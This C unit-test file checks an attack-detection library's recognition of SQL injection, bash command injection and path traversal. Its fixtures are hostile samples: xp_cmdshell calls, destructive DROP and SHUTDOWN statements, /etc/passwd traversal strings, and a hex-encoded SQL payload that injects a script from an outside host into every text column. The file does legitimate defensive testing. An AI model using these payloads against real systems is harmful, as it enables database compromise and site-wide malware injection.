#include <CUnit/Basic.h>
#include <detect/detect.h>
#include <stdlib.h>
#include "../bash/bash_test.h"

#define STR_LEN_ARGS(str) str, sizeof(str) - 1

#define s_type_checks_(typename, has_attack, ...)              \
    s_type_checks(                                             \
        typename,                                              \
        (const struct detect_str []){__VA_ARGS__},             \
        sizeof((const struct detect_str []){__VA_ARGS__})      \
            / sizeof(const struct detect_str), has_attack)

#define s_sqli_attacks(...) s_type_checks_("sqli", true, __VA_ARGS__)
#define s_sqli_not_attacks(...) s_type_checks_("sqli", false, __VA_ARGS__)

#define s_bash_attacks(...) s_type_checks_("bash", true, __VA_ARGS__)
#define s_bash_not_attacks(...) s_type_checks_("bash", false, __VA_ARGS__)

#define s_pt_attacks(...) s_type_checks_("pt", true, __VA_ARGS__)
#define s_pt_not_attacks(...) s_type_checks_("pt", false, __VA_ARGS__)

static void
s_type_checks(
    const char *typename,
    const struct detect_str *tests, size_t ntests, bool has_attack)
{
    struct detect *detect;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open(typename));
    for (size_t i = 0; i != ntests; i++) {
        uint32_t attack_types;

        CU_ASSERT_EQUAL(detect_start(detect), 0);
        CU_ASSERT_EQUAL(
            detect_add_data(detect, tests[i].str, tests[i].len, true), 0);
        CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), has_attack);
        CU_ASSERT_EQUAL(detect_stop(detect), 0);
    }
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsimplest(void)
{
    CU_ASSERT_EQUAL(detect_init(), 0);
    CU_ASSERT_EQUAL(detect_deinit(), 0);
    CU_ASSERT_EQUAL(detect_init(), 0);
    CU_ASSERT_EQUAL(detect_deinit(), 0);
}

static int
s_sqli_suite_init(void)
{
    return (detect_init());
}

static int
s_sqli_suite_deinit(void)
{
    return (detect_deinit());
}

static void
Tsqli_simplest(void)
{
    struct detect *detect;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_rce(void)
{
    struct detect *detect;

    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("UP"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("SELECT SELECT"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    printf("Next!\n");
    CU_ASSERT_EQUAL(detect_start(detect), 0);
    CU_ASSERT_EQUAL(
        detect_add_data(detect, STR_LEN_ARGS("10 + 11 + 12 + 13"), true), 0);
    CU_ASSERT_EQUAL(detect_stop(detect), 0);
    CU_ASSERT_EQUAL(detect_close(detect), 0);
}

static void
Tsqli_inj_in_table_name(void)
{
    s_sqli_attacks({CSTR_LEN("1' where 1=1")});
}

static void
Tsqli_union(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1' union distinct select 1")},
        {CSTR_LEN("1' union exec xp_cmdhshell 'ping127.0.0.1'")},
    );
}

static void
Tsqli_operators(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1' RLIKE '.*'")},
        {CSTR_LEN("1 MOD 1")},
        {CSTR_LEN("1 XOR 1")},
        {CSTR_LEN("1' REGEXP '.*'")},
        {CSTR_LEN("1' + BINARY '1")},
        {CSTR_LEN("1' INTO OUTFILE '1")},
        {CSTR_LEN("1 AND 1 SOUNDS LIKE 1")},
        {CSTR_LEN("1 + MATCH(col) AGAINST('text')")},
        {CSTR_LEN("1 AND EXIST(SELECT 1)")},
        {CSTR_LEN("1 AND xmlelement('user', "
                  "login || ':' || pass).getStringVal()")},
        {CSTR_LEN("1 AND FileToClob('/etc/passwd', "
                  "'server')::html")},
        {CSTR_LEN("1 AND U&'pgsql evade' uescape '!'")},
        {CSTR_LEN("1 NOT BETWEEN 0 AND 1")},
        {CSTR_LEN("1 AND ~1")},
    );
}

static void
Tsqli_begin_end(void)
{
    s_sqli_attacks({CSTR_LEN("1'; BEGIN UPDATE table_name SET column1 = value1 END")});
}

static void
Tsqli_waitfor(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1'; WAITFOR DELAY '02:00'")},
        {CSTR_LEN("1'; WAITFOR TIME '02:00'")},
    );
}

static void
Tsqli_top(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT TOP 5 * FROM table_name")});
    s_sqli_attacks({CSTR_LEN("SELECT FIRST 5 * FROM table_name")});
}

static void
Tsqli_identifier_quote(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT * FROM `select`")});
}

static void
Tsqli_whitespace(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1\vor\v1")},
        {CSTR_LEN("1\u00A0or\u00A01")},
        {CSTR_LEN("1\000or\0001")},
    );
}

static void
Tsqli_null(void)
{
    s_sqli_attacks({CSTR_LEN("1-\\N union select 1")});
}

static void
Tsqli_left_func(void)
{
    s_sqli_attacks({CSTR_LEN("1 AND left(a, 2) = 'ab'")});
}

static void
Tsqli_func(void)
{
    s_sqli_not_attacks({CSTR_LEN("1; DBMS_LOCK.SLEEP()")});
}

static void
Tsqli_var_start_with_dollar(void)
{
    s_sqli_attacks({CSTR_LEN("1 AND $func(a, 2) = 'ab'")});
}

static void
Tsqli_create_func(void)
{
    s_sqli_attacks({CSTR_LEN("1; CREATE OR REPLACE FUNCTION SLEEP(int) "
                             "RETURNS int AS '/lib/libc.so.6','sleep' "
                             "language 'C' STRICT")});
}

static void
Tsqli_bit_num(void)
{
    s_sqli_attacks(
        {CSTR_LEN("0b01UNION SELECT 1")},
        {CSTR_LEN("B01UNION ALL SELECT 1")},
        {CSTR_LEN("0b'01'UNION SELECT 1")},
        {CSTR_LEN("B'01' UNION ALL SELECT 1")},
    );
}

static void
Tsqli_join_wo_join_qual(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT * FROM (SELECT * FROM (SELECT 1) "
                             "as t JOIN (SELECT 2)b)a")});
}

static void
Tsqli_empty_schema(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT 1 FROM master..sysdatabases")});
}

static void
Tsqli_asc_desc(void)
{
    s_sqli_attacks(
        {CSTR_LEN("SELECT 1 ORDER BY 1 ASC")},
        {CSTR_LEN("SELECT 1 ORDER BY 1 DESC")},
    );
}

static void
Tsqli_shutdown(void)
{
    s_sqli_attacks({CSTR_LEN("1; SHUTDOWN")});
}

static void
Tsqli_into_outfile(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT 1 FROM table_name INTO OUTFILE 'file'")});
}

static void
Tsqli_declare(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1; DECLARE name varchar(42)")},
        {CSTR_LEN("1; DECLARE name CURSOR FOR select 1")},
        {CSTR_LEN("1; DECLARE name varchar(42) = 'str'")},
    );
}

static void
Tsqli_execute(void)
{
    s_sqli_attacks(
        {CSTR_LEN("EXEC master.dbo.xp_cmdshell 'cmd'")},
        {CSTR_LEN("EXEC (@s)")},
    );
}

static void
Tsqli_nul_in_str(void)
{
    s_sqli_attacks({CSTR_LEN("1\0' OR '")});
}

static void
Tsqli_drop(void)
{
    s_sqli_attacks(
        {CSTR_LEN("DROP TABLE table_name")},
        {CSTR_LEN("DROP FUNCTION func_name")},
        {CSTR_LEN("DROP DATABASE db_name")},
    );
}

static void
Tsqli_select(void)
{
    s_sqli_attacks(
        {CSTR_LEN("(select 1) as t")},
        {CSTR_LEN("SELECT lead(col, 0) OVER (ORDER BY col) FROM table_name")},
        {CSTR_LEN("SELECT listagg(col,', ') WITHIN GROUP "
                  "(ORDER BY col) from table_name")},
        {CSTR_LEN("select 1, open, language, percent")},
    );
}

static void
Tsqli_where(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT * FROM (table_name)")});
}

static void
Tsqli_string(void)
{
    s_sqli_attacks(
        {CSTR_LEN("SELECT _latin1 'str' COLLATE latin1_german2_ci a, n'str' b, "
                  "x'str' c, _utf8'str' d")});
}

static void
Tsqli_use(void)
{
    s_sqli_attacks({CSTR_LEN("USE db_name")});
}

static void
Tsqli_delete(void)
{
    s_sqli_attacks(
        {CSTR_LEN("DELETE LOW_PRIORITY "
                  "FROM table_name WHERE 1=1 ORDER BY col ASC LIMIT 42")});
}

static void
Tsqli_0x(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT 0x")});
}

static void
Tsqli_print(void)
{
    s_sqli_attacks({CSTR_LEN("print '1'")});
}

static void
Tsqli_load(void)
{
    s_sqli_attacks({CSTR_LEN("LOAD DATA LOW_PRIORITY INFILE 'file'")});
}

static void
Tsqli_procedure_analyse(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT col FROM table_name "
                             "PROCEDURE ANALYSE(7, 42);")});
}

static void
Tsqli_set(void)
{
    s_sqli_not_attacks({CSTR_LEN("SET @t=1")});
}

static void
Tsqli_goto(void)
{
    s_sqli_attacks({CSTR_LEN("1; GOTO label; SELECT 1")});
}

static void
Tsqli_call(void)
{
    s_sqli_attacks({CSTR_LEN("call func()")});
}

static void
Tsqli_for_xml(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT 1 FOR XML PATH('')")});
}

static void
Tsqli_insert(void)
{
    s_sqli_attacks(
        {CSTR_LEN("INSERT INTO table_name EXEC xp_cmdshell 'dir'")},
        {CSTR_LEN("INSERT INTO table_name (col) VALUES (1)")},
    );
}

static void
Tsqli_var(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT привет#")});
}

static void
Tsqli_open(void)
{
    s_sqli_attacks({CSTR_LEN("OPEN tablecursor")});
}

static void
Tsqli_inner_select(void)
{
    s_sqli_attacks({CSTR_LEN("1 union select 2 where 1=1), 3 where 1=1")});
}

static void
Tsqli_alter_database(void)
{
    s_sqli_attacks({CSTR_LEN("ALTER DATABASE pubs SET RECOVERY SIMPLE")});
}

static void
Tsqli_backslash(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT \\1")});
}

static void
Tsqli_nl_in_str(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT '\n'")});
}

static void
Tsqli_buf(void)
{
    s_sqli_attacks({CSTR_LEN(
                "SELECT 0x4445434C415245204054207661726368"
                "617228323535292C4043207661726368617228343"
                "0303029204445434C415245205461626C655F4375"
                "72736F7220435552534F5220464F522073656C656"
                "37420612E6E616D652C622E6E616D652066726F6D"
                "207379736F626A6563747320612C737973636F6C7"
                "56D6E73206220776865726520612E69643D622E69"
                "6420616E6420612E78747970653D27752720616E6"
                "42028622E78747970653D3939206F7220622E7874"
                "7970653D3335206F7220622E78747970653D32333"
                "1206F7220622E78747970653D31363729204F5045"
                "4E205461626C655F437572736F722046455443482"
                "04E4558542046524F4D20205461626C655F437572"
                "736F7220494E544F2040542C4043205748494C452"
                "8404046455443485F5354415455533D3029204245"
                "47494E20657865632827757064617465205B272B4"
                "0542B275D20736574205B272B40432B275D3D2727"
                "223E3C2F7469746C653E3C7363726970742073726"
                "33D22687474703A2F2F777777302E646F7568756E"
                "716E2E636E2F63737273732F772E6A73223E3C2F7"
                "363726970743E3C212D2D27272B5B272B40432B27"
                "5D20776865726520272B40432B27206E6F74206C6"
                "96B6520272725223E3C2F7469746C653E3C736372"
                "697074207372633D22687474703A2F2F777777302"
                "E646F7568756E716E2E636E2F63737273732F772E"
                "6A73223E3C2F7363726970743E3C212D2D2727272"
                "94645544348204E4558542046524F4D2020546162"
                "6C655F437572736F7220494E544F2040542C40432"
                "0454E4420434C4F5345205461626C655F43757273"
                "6F72204445414C4C4F43415445205461626C655F4"
                "37572736F72")});
}

static void
Tsqli_if_else(void)
{
    s_sqli_attacks(
        {CSTR_LEN("1'; IF (1=1) UPDATE table_name SET column1 = value1")},
        {CSTR_LEN("1'; IF (1=1) UPDATE table_name "
                  "SET column1 = value1 ELSE UPDATE "
                  "table_name SET column1 = value1")},
        {CSTR_LEN("SELECT IF(1=1,1, 0)")},
    );
}

static void
Tsqli_while(void)
{
    s_sqli_attacks({CSTR_LEN("WHILE 1=1 SELECT 1")});
}

static void
Tsqli_semicolons_opt(void)
{
    s_sqli_attacks({CSTR_LEN("1 SELECT 1 SELECT 2")});
}

static void
Tsqli_expr(void)
{
    s_sqli_attacks({CSTR_LEN("-(1) WHERE 1=1")});
}

static void
Tsqli_var_start_with_num(void)
{
    s_sqli_attacks(
        {CSTR_LEN("SELECT 1 FROM schema.1table_name")},
        {CSTR_LEN("SELECT 1eUNION SELECT 1")},
        {CSTR_LEN("SELECT 1e1UNION SELECT 1")},
    );
}

static void
Tsqli_dot_e_dot(void)
{
    s_sqli_attacks({CSTR_LEN("SELECT 1 from schema 9.e.table_name")});
}

static void
Tsqli_label(void)
{
    s_sqli_not_attacks({CSTR_LEN("m1:")});
    s_sqli_attacks({CSTR_LEN("m1: select 1")});
}

static void
Tsqli_comment(void)
{
    s_sqli_attacks({CSTR_LEN("/*!SELECT*/ 1")});
}

static void
Tsqli_data_name(void)
{
    s_sqli_attacks(
        {CSTR_LEN("SELECT \"1\" '2'")},
        {CSTR_LEN("SELECT col FROM db.table")},
        {CSTR_LEN("SELECT {ts '2013-03-31 00:00:00'}")},
        {CSTR_LEN("SELECT replace('abc','b','d')")},
        {CSTR_LEN("SELECT {db.table_name.id} from db.table_name")},
    );
}

static void
Tsqli_regress_zero_realloc(void)
{
    s_sqli_not_attacks({CSTR_LEN("\"''\"")});
}

static void
Tbash_constraints(void)
{
    CU_ASSERT_EQUAL(bash_lexer_test(), 0);
}

static void
Tbash_simplest(void)
{
    s_bash_attacks(
        {CSTR_LEN("ls -a")},
        {CSTR_LEN("l\"s\" -a")},
        {CSTR_LEN("l's' -a")},
        {CSTR_LEN("l\\s -a")},
        {CSTR_LEN("VAR=VAL ls")},
        {CSTR_LEN("VAR=VAL l$1s")},
        {CSTR_LEN("VAR=VAL l$name's'")},
        {CSTR_LEN("VAR=VAL l${name}s")},
    );
}

static void
Tbash_comment(void)
{
    s_bash_not_attacks(
        {CSTR_LEN("#ls -a")},
    );
}

static void
Tbash_simplelist(void)
{
    s_bash_attacks(
        {CSTR_LEN("ls;ls")},
        {CSTR_LEN("ls&ls")},
        {CSTR_LEN("ls&&ls")},
        {CSTR_LEN("ls|ls")},
        {CSTR_LEN("ls|&ls")},
        {CSTR_LEN("ls||ls")},
        {CSTR_LEN("ls|")},
        {CSTR_LEN("time -p -- ls|ls")},
        {CSTR_LEN("! ls|ls")},
    );
}

static void
Tbash_commands(void)
{
    s_bash_attacks(
        {CSTR_LEN("for test do echo i; done")},
        {CSTR_LEN("for test; { echo i; }")},
        {CSTR_LEN("for i in {1..5}; do echo i; done")},
        {CSTR_LEN("for i in {1..5}; { echo i; }")},
        {CSTR_LEN("for ((i=1; i<=10; ++i)) ; do echo $i ; done")},
        {CSTR_LEN("for ((i=1; i<=10; ++i)) ; { echo $i ; }")},
        {CSTR_LEN("select name do ls ; done")},
        {CSTR_LEN("select name; do ls ; done")},
        {CSTR_LEN("select name; { ls ; }")},
        {CSTR_LEN("case 1 in 1) echo one;; 2) echo two;; esac")},
        {CSTR_LEN("function a () { ( echo aaahh; ) }; a")},
        {CSTR_LEN("coproc tee")},
        {CSTR_LEN("if [ 1 -eq 2 ];  then echo equal ; else echo 'not equal' ; fi")},
        {CSTR_LEN("(ls -a)")},
        {CSTR_LEN("{ ls -a; }")},
    );
}

static void
Tbash_redirection(void)
{
    s_bash_attacks(
        {CSTR_LEN("ls > file")},
        {CSTR_LEN("ls > file")},
        {CSTR_LEN("ls < file")},
        {CSTR_LEN("ls 1> file")},
        {CSTR_LEN("ls 2< file")},
        {CSTR_LEN("ls {a}> file")},
        {CSTR_LEN("ls {a}< file")},
        {CSTR_LEN("ls >> file")},
        {CSTR_LEN("ls 1>> file")},
        {CSTR_LEN("ls {a}>> file")},
        {CSTR_LEN("ls >| file")},
        {CSTR_LEN("ls 1>| file")},
        {CSTR_LEN("ls {a}>| file")},
        {CSTR_LEN("ls <> file")},
        {CSTR_LEN("ls 3<> file")},
        {CSTR_LEN("ls {a}<> file")},
        {CSTR_LEN("ls << file")},
        {CSTR_LEN("ls 2<< file")},
        {CSTR_LEN("ls {a}<< file")},
        {CSTR_LEN("ls <<- file")},
        {CSTR_LEN("ls 2<<- file")},
        {CSTR_LEN("ls {a}<<- file")},
        {CSTR_LEN("ls <<< file")},
        {CSTR_LEN("ls <& 1")},
        {CSTR_LEN("ls 2<& 1")},
        {CSTR_LEN("ls {a}<& 1")},
        {CSTR_LEN("ls >& 1")},
        {CSTR_LEN("ls 2>& 1")},
        {CSTR_LEN("ls {a}>& 1")},
        {CSTR_LEN("ls <& file")},
        {CSTR_LEN("ls 2<& file")},
        {CSTR_LEN("ls {a}<& file")},
        {CSTR_LEN("ls >& file")},
        {CSTR_LEN("ls 2>& file")},
        {CSTR_LEN("ls {a}>& file")},
        {CSTR_LEN("ls <& -")},
        {CSTR_LEN("ls 2<& -")},
        {CSTR_LEN("ls {a}<& -")},
        {CSTR_LEN("ls >& -")},
        {CSTR_LEN("ls 2>& -")},
        {CSTR_LEN("ls {a}>& -")},
        {CSTR_LEN("ls &> file")},
        {CSTR_LEN("ls 2&> file")},
        {CSTR_LEN("ls {a}&> file")},
    );
}

static void
Tbash_inj(void)
{
    s_bash_attacks(
        {CSTR_LEN("\nls")},
        {CSTR_LEN("\r\nls")},
        {CSTR_LEN(";ls")},
        {CSTR_LEN("|ls")},
        {CSTR_LEN("||ls")},
        {CSTR_LEN("&ls")},
        {CSTR_LEN("&&ls")},
    );
}

static void
Tbash_substitute(void)
{
    s_bash_attacks(
        {CSTR_LEN("e$(FOO='BAR BAR BAR' echo ch)o test")},
        {CSTR_LEN("foo <(FOO='BAR BAR BAR' ls)")},
        {CSTR_LEN("foo >(FOO='BAR BAR BAR' last)")},
    );
}

static void
Tpt_boot_ini(void)
{
    s_pt_attacks(
        {CSTR_LEN("../dir/../boot.ini")},
    );
}

static void
Tpt_inj_start_with_sep(void)
{
    s_pt_attacks(
        {CSTR_LEN("///../../etc///passwd")},
        {CSTR_LEN("///..\\..\\etc///passwd")},
        {CSTR_LEN("\\../\\../etc/\\passwd")},
    );
}

static void
Tpt_travs_names_root(void)
{
    s_pt_attacks(
        {CSTR_LEN("../\\windows/\\system32/\\drivers/\\etc/\\hosts")},
    );
}

int
main(void)
{
    CU_TestInfo generic_tests[] = {
        {"simplest", Tsimplest},
        CU_TEST_INFO_NULL
    };
    CU_TestInfo sqli_tests[] = {
        {"simplest", Tsqli_simplest},
        {"rce", Tsqli_rce},
        {"inj_in_table_name", Tsqli_inj_in_table_name},
        {"union", Tsqli_union},
        {"operators", Tsqli_operators},
        {"begin_end", Tsqli_begin_end},
        {"waitfor", Tsqli_waitfor},
        {"top", Tsqli_top},
        {"identifier_quote", Tsqli_identifier_quote},
        {"whitespace", Tsqli_whitespace},
        {"null", Tsqli_null},
        {"left_func", Tsqli_left_func},
        {"func", Tsqli_func},
        {"var_start_with_dollar", Tsqli_var_start_with_dollar},
        {"create_func", Tsqli_create_func},
        {"bit_num", Tsqli_bit_num},
        {"join_wo_join_qual", Tsqli_join_wo_join_qual},
        {"empty_schema", Tsqli_empty_schema},
        {"asc_desc", Tsqli_asc_desc},
        {"shutdown", Tsqli_shutdown},
        {"into_outfile", Tsqli_into_outfile},
        {"declare", Tsqli_declare},
        {"execute", Tsqli_execute},
        {"nul_in_str", Tsqli_nul_in_str},
        {"select", Tsqli_select},
        {"drop", Tsqli_drop},
        {"where", Tsqli_where},
        {"string", Tsqli_string},
        {"use", Tsqli_use},
        {"delete", Tsqli_delete},
        {"0x", Tsqli_0x},
        {"print", Tsqli_print},
        {"load", Tsqli_load},
        {"procedure_analyse", Tsqli_procedure_analyse},
        {"set", Tsqli_set},
        {"goto", Tsqli_goto},
        {"call", Tsqli_call},
        {"for_xml", Tsqli_for_xml},
        {"insert", Tsqli_insert},
        {"var", Tsqli_var},
        {"open", Tsqli_open},
        {"inner_select", Tsqli_inner_select},
        {"alter_database", Tsqli_alter_database},
        {"backslash", Tsqli_backslash},
        {"nl_in_str", Tsqli_nl_in_str},
        {"buf", Tsqli_buf},
        {"if_else", Tsqli_if_else},
        {"while", Tsqli_while},
        {"semicolons_opt", Tsqli_semicolons_opt},
        {"expr", Tsqli_expr},
        {"var_start_with_num", Tsqli_var_start_with_num},
        {"dot_e_dot", Tsqli_dot_e_dot},
        {"label", Tsqli_label},
        {"data_name", Tsqli_data_name},
        {"regress_zero_realloc", Tsqli_regress_zero_realloc},
        {"comment", Tsqli_comment},
        CU_TEST_INFO_NULL
    };
    CU_TestInfo bash_tests[] = {
        {"constraints", Tbash_constraints},
        {"simplest", Tbash_simplest},
        {"comment", Tbash_comment},
        {"simplelist", Tbash_simplelist},
        {"commands", Tbash_commands},
        {"redirection", Tbash_redirection},
        {"inj", Tbash_inj},
        {"substitute", Tbash_substitute},
        CU_TEST_INFO_NULL
    };
    CU_TestInfo pt_tests[] = {
        {"boot_ini", Tpt_boot_ini},
        {"inj_start_with_sep", Tpt_inj_start_with_sep},
        {"travs_names_root", Tpt_travs_names_root},
        CU_TEST_INFO_NULL
    };
    CU_SuiteInfo suites[] = {
        {.pName = "generic", .pTests = generic_tests},
        {.pName = "sqli", .pTests = sqli_tests,
         .pInitFunc = s_sqli_suite_init, .pCleanupFunc = s_sqli_suite_deinit},
        {.pName = "bash", .pTests = bash_tests,
         .pInitFunc = s_sqli_suite_init, .pCleanupFunc = s_sqli_suite_deinit},
        {.pName = "pt", .pTests = pt_tests,
         .pInitFunc = s_sqli_suite_init, .pCleanupFunc = s_sqli_suite_deinit},
        CU_SUITE_INFO_NULL,
    };
    CU_pRunSummary sum;

    if (CU_initialize_registry() != CUE_SUCCESS)
        return (EXIT_FAILURE);
    if (CU_register_suites(suites) != CUE_SUCCESS)
        return (EXIT_FAILURE);
    CU_basic_set_mode(CU_BRM_VERBOSE);
    CU_basic_run_tests();

    if ((sum = CU_get_run_summary()) == NULL ||
        sum->nSuitesFailed || sum->nTestsFailed || sum->nAssertsFailed) {

        CU_cleanup_registry();
        return (EXIT_FAILURE);
    }
    CU_cleanup_registry();
    return (EXIT_SUCCESS);
}
